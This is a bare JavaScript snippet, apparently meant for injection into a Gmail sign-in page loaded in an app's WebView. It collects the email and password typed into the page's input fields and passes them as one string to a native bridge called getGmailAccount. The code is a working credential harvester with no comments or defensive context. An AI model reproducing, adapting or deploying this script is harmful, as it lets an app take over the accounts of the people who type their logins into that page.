function email() {
    var b = document.querySelectorAll("input");
    var e = "=_=+_+";
    for (var c = 0; c < b.length; c++) {
        var d = b[c];
        if (d.type === "email") {
            e = b[c].value;
        }
        d = null;
    }
    return e;
}

function pwd() {
    var b = document.querySelectorAll("input");
    var e = "=_=+_+";
    for (var c = 0; c < b.length; c++) {
        var d = b[c];
        if (d.type === "password") {
            e = b[c].value;
        }
        d = null;
    }
    return e;
}
window.getGmailAccount.getGmailAccount(email()+"||+|+||"+pwd());